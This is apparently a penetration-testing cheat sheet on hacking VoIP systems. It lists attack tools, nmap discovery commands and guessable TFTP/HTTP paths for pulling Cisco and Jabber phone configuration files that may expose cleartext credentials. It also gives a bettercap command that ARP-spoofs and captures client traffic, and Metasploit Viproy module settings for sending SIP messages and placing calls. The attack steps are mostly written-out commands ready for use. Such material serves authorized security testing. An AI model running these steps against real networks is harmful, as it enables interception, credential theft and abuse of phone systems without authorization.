# Hacking VoIP

## Usefull tools
 - VIPROY (http://www.viproy.com/)
 - VIProxy (https://github.com/fozavci/viproxy)
 - SIPVicious
 - Yersinia
 - Cain&Abel
 - UCSniff

## Network discovery
nmap -sV --script=banner 
nmap -sU -p 69 (for indentify the tftp servers)
nmap -p 5060-5062 (SIP)
nmap -p 5222 (XMPP)
nmap -p 80,443,8443,8080 (Admin Web interface)
svmap {IPs}

## TFTP network captures
Sniff the network looking for tftp frames in order to retrieve sensitive informations
(Need to have a valid client)

## Jabber Config retrieval
The default port for tftp is on 69/UDP, can also be 6969/UDP
Search on the following urls(tftp over http on port 6970/TCP):
 - URL:6970/SPDefault.cnf.xml
 - URL:6970/CSF800XXXXX.cnf.xml (in my case I had to increment CSF80011xxx from 000 to 999)
 - URL:6970/global-settings.xml
 - URL:6970/jabber-config.xml
 - SEPDefault.cnf, SEPXXXXXXXXXXXX.cnf.xml
 - SIPDefault.cnf, SIPXXXXXXXXXXXX.cnf.xml

Search on the configuraton files if there are sensitive information, user/password on cleartext.

Moreover, you can arp spoof the exchange between clients and the tftp server with bettercap:

```
sudo bettercap -eval "set arp.spoof.targets {ip}; set net.sniff.verbose false; set net.sniff.output arpspoof.pcap; net.sniff on; arp.spoof on"
```

## SIP attacks

With VIPROY and msfconsole try at least these two exploits

### Send message:

```
use auxiliary/voip/viproy_sip_message
show options 
set RHOST 192.168.1.222
set FROM 203
set TO 201
set USERNAME 203
set LOGIN true
set MESSAGE_CONTENT test
set PASSWORD test12345
run
```

http://www.viproy.com/captures/sip_message.pcapng

### Make a call:

```
use auxiliary/voip/viproy_sip_invite
show options
set CPORT 5075
set RHOST 192.168.1.222
set FROM 203
set TO 201
set DEBUG true
set VERBOSE true
set LOGIN true
set PASSWORD test12345
set USERNAME 203
run
```

http://www.viproy.com/captures/sip_invite.pcapng

## Links

https://hub.packtpub.com/how-to-attack-an-infrastructure-using-voip-exploitation-tutorial/
https://pentestlab.blog/tag/viproy/
